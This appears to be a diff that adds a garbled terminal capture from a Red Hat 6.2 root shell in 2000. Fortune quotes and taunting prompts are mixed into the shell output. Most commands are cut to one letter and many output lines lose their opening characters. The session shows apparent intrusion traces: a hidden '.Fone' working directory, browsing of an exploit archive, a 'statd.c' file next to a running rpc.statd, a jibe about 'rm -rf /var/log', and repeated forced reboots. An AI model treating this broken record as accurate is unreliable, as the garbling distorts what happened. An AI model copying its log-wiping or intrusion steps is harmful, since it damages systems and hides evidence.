+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+
+Hildebrant's Principle:
+	If you don't know where you are going, any road will get you there.
+
+Try cd...
+
+[root@ariel .Fone]# d
+
+top
+
+Documentation is like sex: when it is good, it is very, very good; and
+when it is bad, it is better than nothing.
+		-- Dick Brandon
+
+Try cd...
+
+[root@ariel .Fone]# H
+
+h: HACKER: command not found
+
+"Lead us in a few words of silent prayer."
+-- Bill Peterson, former Houston Oiler football coach
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# p
+
+D TTY      STAT   TIME COMMAND
+    1 ?        S      0:04 init [3]
+    2 ?        SW     0:00 [kflushd]
+    3 ?        SW     0:00 [kupdate]
+    4 ?        SW     0:00 [kpiod]
+    5 ?        SW     0:00 [kswapd]
+    6 ?        SW<    0:00 [mdrecoveryd]
+  309 ?        S      0:00 /sbin/pump -i eth0
+  377 ?        SW     0:00 [lockd]
+  378 ?        SW     0:00 [rpciod]
+  387 ?        S      0:00 rpc.statd
+  401 ?        S      0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-sc
+  428 ?        S      0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto
+  481 ?        S      0:00 syslogd -m 0
+  490 ?        S      0:00 klogd
+  554 ?        S      0:00 inetd
+  568 ?        S      0:00 smbd -D
+  577 ?        S      0:00 nmbd -D
+  591 ?        S      0:00 lpd
+  639 ?        S      0:00 sendmail: accepting connections on port 25
+  753 ?        S      0:00 /usr/sbin/amd -F /etc/amd.conf
+  795 tty2     S      0:00 /sbin/mingetty tty2
+  796 tty3     S      0:00 /sbin/mingetty tty3
+  797 tty4     S      0:00 /sbin/mingetty tty4
+  798 tty5     S      0:00 /sbin/mingetty tty5
+  799 tty6     S      0:00 /sbin/mingetty tty6
+  802 tty1     S      0:00 /sbin/mingetty tty1
+  961 pts/0    S      0:00 bash
+ 1103 pts/1    S      0:00 bash
+ 1370 pts/0    S      0:00 lynx packetstorm.securify.com
+ 1373 pts/0    Z      0:00 [lynx <defunct>]
+
+O'Reilly's Law of the Kitchen:
+	Cleanliness is next to impossible
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# p
+
+D TTY      STAT   TIME COMMAND
+    1 ?        S      0:04 init [3]
+    2 ?        SW     0:00 [kflushd]
+    3 ?        SW     0:00 [kupdate]
+    4 ?        SW     0:00 [kpiod]
+    5 ?        SW     0:00 [kswapd]
+    6 ?        SW<    0:00 [mdrecoveryd]
+  309 ?        S      0:00 /sbin/pump -i eth0
+  377 ?        SW     0:00 [lockd]
+  378 ?        SW     0:00 [rpciod]
+  387 ?        S      0:00 rpc.statd
+  401 ?        S      0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-sc
+  428 ?        S      0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto
+  481 ?        S      0:00 syslogd -m 0
+  490 ?        S      0:00 klogd
+  554 ?        S      0:00 inetd
+  568 ?        S      0:00 smbd -D
+  577 ?        S      0:00 nmbd -D
+  591 ?        S      0:00 lpd
+  639 ?        S      0:00 sendmail: accepting connections on port 25
+  753 ?        S      0:00 /usr/sbin/amd -F /etc/amd.conf
+  795 tty2     S      0:00 /sbin/mingetty tty2
+  796 tty3     S      0:00 /sbin/mingetty tty3
+  797 tty4     S      0:00 /sbin/mingetty tty4
+  798 tty5     S      0:00 /sbin/mingetty tty5
+  799 tty6     S      0:00 /sbin/mingetty tty6
+  802 tty1     S      0:00 /sbin/mingetty tty1
+  961 pts/0    S      0:00 bash
+ 1103 pts/1    S      0:00 bash
+
+Weekends were made for programming.
+- Karl Lehenbauer
+
+Try cd...
+
+[root@ariel .Fone]# e
+
+Ladybug, ladybug,
+Look to your stern!
+Your house is on fire,
+Your children will burn!
+So jump ye and sing, for
+The very first time
+The four lines above
+Have been put into rhyme.
+		-- Walt Kelly
+
+You're not getting worse, but no better either
+
+[Fone@ariel .Fone]$ e
+
+ut
+
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i686
+
+ 
+
+word: 
+
+ are preparing to think about contemplating preliminary work on plans to
+develop a schedule for producing the 10th Edition of the Unix Programmers
+Manual.
+		-- Andrew Hume
+
+You are a dolt; cd for a better life!
+
+[Fone@ariel .Fone]$ s
+
+word: 
+
+rubbing floors and emptying bedpans has as much dignity as the Presidency.
+		-- Richard Nixon
+
+No wonder it took you days to figure out rm -rf /var/log
+
+[root@ariel .Fone]# d
+
+ktop  msg01912.html	msg01912.html~	statd.c
+
+Her days were spent in a kind of slow bustle; always busy without getting
+on, always behind hand and lamenting it, without altering her ways;
+wishing to be an economist, without contrivance or regularity; dissatisfied
+with her servants, without skill to make them better, and whether helping, or
+reprimanding, or indulging them, without any power of engaging their respect.
+		-- J. Austen
+
+cd, stupid, cd!
+
+[root@ariel .Fone]# n
+
+er:  serrano.bconnected.net
+Address:  209.53.0.17
+
+Name:    www.hotbot.com
+Addresses:  209.202.222.16, 209.185.151.128
+
+When the saleman's car broke down, he walked to the nearest farmhouse to ask
+if he could stay the night.  The farmer agreed to put him up.  "I live alone,"
+he continued, "you can have the bedroom at the top of the stairs, to the
+right."
+	"Oh, never mind," the disappointed salesman said. "I think I'm in
+the wrong joke."
+
+Come on, play my game.  cd somewhere and see what happens
+
+[root@ariel .Fone]# w
+
+: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+
+"There is nothing new under the sun, but there are lots of old things 
+ we don't know yet."
+ -Ambrose Bierce
+
+You are pathetic !!! TYPE CD !!!
+
+[root@ariel .Fone]# c
+
+Who messed with my anti-paranoia shot?
+
+Come on, play my game.  cd somewhere and see what happens
+
+[root@ariel .Fone]# 
+
+roadcast message from root (console) Fri Nov 24 12:32:57 2000...
+
+The system is going down for reboot NOW !!
+
+Broadcast message from root (console) Fri Nov 24 12:32:58 2000...
+
+The system is going down for reboot NOW !!
+
+Broadcast message from root (console) Fri Nov 24 12:32:58 2000...
+
+The system is going down for reboot NOW !!
